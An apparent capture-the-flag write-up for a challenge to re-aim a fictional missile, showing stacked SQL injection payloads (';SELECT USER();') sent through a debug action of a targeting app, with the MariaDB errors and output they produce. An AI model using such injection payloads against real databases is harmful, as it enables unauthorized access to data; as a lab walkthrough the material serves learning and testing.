## Objective
Thwart Jack's evil plan by re-aiming his missile at the Sun.

## Solution

#### Enable the missile targetting system app and get the directory service URI

```
....
INFO: URI: maltcp://10.1.1.1:1025/missile-targeting-system-Directory
```
#### Connect to the Parameter Service


#### Injecting SQL Queries

```
;USER();
```

````
[ WARN] (ActionsExecutor-thread-2) Error: 1064-42000: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'USER()' at line 1
2023-12-28 16:17:33.951 esa.mo.nmf.apps.MissileTargetingSystemMCAdapter sqlDebug
WARNING: Debug action error: java.sql.SQLSyntaxErrorException: (conn=676) You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'USER()' at line 1
2023-12-28 16:17:33.957 esa.mo.nmf.apps.MissileTargetingSystemMCAdapter sqlDebug
WARNING: Debug action query: SELECT VERSION();USER();
````

```
;SELECT USER();
```
```
USER(): targeter@172.18.0.3 | 
```
